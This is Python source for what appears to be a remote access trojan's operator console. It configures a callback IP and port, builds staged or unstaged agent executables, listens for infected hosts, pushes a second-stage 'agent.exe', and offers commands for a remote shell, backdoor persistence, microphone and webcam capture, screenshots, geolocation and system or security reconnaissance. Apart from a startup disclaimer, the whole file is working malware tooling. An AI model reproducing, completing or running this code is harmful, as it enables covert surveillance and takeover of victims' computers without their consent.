from mainclass.system import system
from colorama import Fore, init
from threading import *
from mainclass import shell as shclass
from mainclass.builder import builder
from mainclass.encrypter import *
from mainclass.options import options
import socket, os, struct

ip = ""
port = 0

def shell(conn, address): shclass.shell(conn, address)
def backdoor(conn, address): shclass.backdoor(conn, address)
def recordmic(conn, address): shclass.mic(conn, address)
def uploadfile(conn, address): shclass.upload(conn, address)
def cam(conn, address): shclass.cam(conn, address)
def getlocation(conn, address): shclass.geo(conn, address)
def destroybackdoor(conn, address): shclass.delete(conn, address)
def sysinfo(conn, address): shclass.sysinfo(conn, address)
def secinfo(conn, address): shclass.secinfo(conn, address)
def notification(conn, address): shclass.send_notification(conn, address)
def screenshot(conn, address): shclass.screenshot(conn, address)

def generateConf(): generate()

def selectIP(): 
    global ip
    system.clear_screen()
    system.printheader()
    system.printMenuOptions(ip, port)
    ip = system.input(1)

def selectPort(): 
    global port
    system.clear_screen()
    system.printheader()
    system.printMenuOptions(ip, port)
    port = system.input(2)

def getPayloadOption():
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(2)
        command = system.input(6).strip('')

        if command == '1' or command == '2':
            break
        elif command == '9':break

    return command

def getAppOption():
    location = 'null'
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(3)
        command = system.input(5).strip('')

        if command == '1':
            location = system.input(5)
            if os.path.exists(location): break
            else: 
                print(Fore.LIGHTRED_EX + '[!] Error: File Not Exists')
                input('OK')
                continue
            
        elif command == '2': break
        elif command == '9':break
        
    return location

def build(): 
    if ip == '' or port == 0:
        print(Fore.LIGHTRED_EX + '[!] Warning: Please Select IP and PORT')
        input('OK')
        return
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(1)
        command = system.input(3).strip('')

        if command == '9': break

        try: b_format = options.build_formats.get(command)
        except: b_format = 'exe'

        payload_option = getPayloadOption()
        app_option = getAppOption()
        if payload_option == '2':
            builder.build(type=b_format, ip=ip, port=port, app=app_option)
            break
        elif payload_option == '1':
            builder.build(type=b_format, ip=ip, port=port, app=app_option, isstaged=True)
            break

def listen():
    if ip == '' or port == 0:
        print(Fore.LIGHTRED_EX + '[!] Warning: Please Select IP and PORT')
        input('OK')
        return
    system.clear_screen()
    system.printheader()
    print(Fore.LIGHTCYAN_EX + "[+] Starting...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(port)))
    s.listen(1)
    conn, address = s.accept()
    print(Fore.LIGHTCYAN_EX + '[+] Waiting Session...')
    print(Fore.LIGHTCYAN_EX + '[+] Session Started... Session Info : ', Fore.LIGHTGREEN_EX + address[0] + Fore.LIGHTGREEN_EX + ':' + Fore.LIGHTGREEN_EX + str(address[1]))
    # send auth using encrypted length-prefixed helpers (keep socket internals unchanged)
    shclass.send_data(conn, system.getdata("authcode").encode())
    try:
        data = shclass.recv_data(conn)
    except ConnectionError:
        print(Fore.LIGHTRED_EX + "[-] Handshake failed, client disconnected")
        conn.close()
        s.close()
        return
    if data == "STAGED":
        print(Fore.LIGHTCYAN_EX + '[+] Stage Uploading...')
        build()
        try:
            with open("./build/agent.exe", 'rb') as f:
                payload_data = f.read()
            shclass.send_data(conn, b"MODE_UPLOAD")
            shclass.send_data(conn, "main.exe".encode())
            control = shclass.recv_data(conn)
            shclass.send_data(conn, payload_data)
            print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
        except Exception as error:
            print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
            input("OK")
        input("OK")
        print(Fore.LIGHTGREEN_EX + '[+] Stage Uploaded!')
        input("OK")
        s.close()
        return
    elif data == "UNSTAGED":
        while True:
            system.clear_screen()
            system.printheader()
            system.printAgentOptions()
            command = system.input(4, address[0], address[1])

            if command == "q": break
            func = agent_options.get(command)
            if func: func(conn, address)
            else: system.clear_screen()
    else:
        print(Fore.LIGHTRED_EX + f"[!] Unexpected client response: {data}")
        conn.close()
        return

menu_options = {"1": build, "2": listen , "3": selectIP, 
                "4": selectPort, "5": generateConf}

agent_options = {"1": shell, "2": backdoor, "3": recordmic, "4": uploadfile,
                 "5":cam, "6": getlocation, "7": destroybackdoor, "8": sysinfo, 
                 "9": notification, "10": screenshot, "11": secinfo}

init(autoreset=True)

system.clear_screen()

def main():
    system.printDisclaimer()
    while True:
        system.clear_screen()
        system.printheader()
        system.printMenuOptions(ip, port)
        command = system.input(0)

        if command == 'q': break
        func = menu_options.get(command)
        if func: func()
        else: system.clear_screen()

if __name__ == '__main__':
    main()
